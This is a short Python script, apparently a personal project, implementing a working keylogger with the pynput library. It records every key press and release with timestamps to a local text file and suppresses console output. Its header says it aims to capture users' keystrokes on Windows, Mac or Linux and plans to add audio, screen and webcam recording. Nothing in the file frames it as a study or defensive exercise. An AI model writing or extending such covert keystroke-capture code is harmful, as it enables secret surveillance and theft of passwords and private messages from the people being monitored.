## ------------------------------------------------------------------------------------- ##
##  Script Name:    Keylogger
##
##  Purpose:        To capture and record keystrokes of users on Windows, Mac, or Linux
##
##  Date Created:   12/13/2023
##
##  Notes:          Once completed, would like to include audio recording, screen recording,
##                  and webcam recording capabilites 
##
## ------------------------------------------------------------------------------------- ##

from pynput.keyboard import Key, Listener
import logging
import datetime

class KeyLogger:    

    def __init__(self, log_file='KeyloggerOutput.txt') -> None:
        self.log_file = log_file
        self.configure_logger()

    # Method to configure the logger we want
    def configure_logger(self) -> None:
        # Remove the default StreamHandler from the root logger so there is no output to the console 
        # and only outputs to the file
        root_logger = logging.getLogger()
        if root_logger.handlers:
            root_logger.handlers.clear()

        # Configure the root logger to the INFO level and set the format
        logging.basicConfig(level=logging.INFO, format='%(levelname)s - %(message)s')

        # Create the logger 
        self.logger = logging.getLogger('keystroke_logger')

        # Create the FileHandler that will write the log messages to a file
        # Set the log level of the FileHandler
        self.fileHandler = logging.FileHandler(self.log_file)
        self.fileHandler.setLevel(logging.INFO)

        # Create the format for the output file log 
        logOutFormat = logging.Formatter('%(levelname)s - %(message)s')
        self.fileHandler.setFormatter(logOutFormat)

        # Add the FileHandler to the logger 
        self.logger.addHandler(self.fileHandler)

    # Method to get the timestamp with the desired format for output file
    @staticmethod
    def get_timestamp() -> str:
        currentTime = datetime.datetime.now().strftime('%m-%d-%Y %H:%M:%S')
        return currentTime
    
    # Method to capture the keystroke attribute
    def get_keystroke_rep(self, key: Key) -> str:
        # Handle the keys that are pressed
        try: 
            key_pressed = key.char
        except AttributeError:
            key_pressed = key.name
        return key_pressed
    
    # Method to log the pressed keystroke info
    def log_keystroke_pressed(self, key) -> None:

        # Check the key pressed to stop logging information
        if key == Key.esc:
            self.stop_log()
        
        timestamp = self.get_timestamp()
        self.logger.info(f'Keystroke pressed ({self.get_keystroke_rep(key)}) event at {timestamp} \n')

    # Method to log the released keystroke
    def log_keystroke_released(self, key) -> None:
        timestamp = self.get_timestamp()
        self.logger.info(f'Keystroke released ({self.get_keystroke_rep(key)}) event at {timestamp} \n')
    
    # Method to start the logging
    def start_log(self) -> None:
        with Listener(on_press=self.log_keystroke_pressed, on_release=self.log_keystroke_released) as listener:
            listener.join()

    # Method to stop the keylogger program from running
    def stop_log(self) -> None:
        self.fileHandler.close()
        exit()


## ------------------------------------------------------------------------------------- ##

if __name__ == '__main__':
    test_keylogger_instance = KeyLogger('test_run.txt')
    test_keylogger_instance.start_log()

## ------------------------------------------------------------------------------------- ##
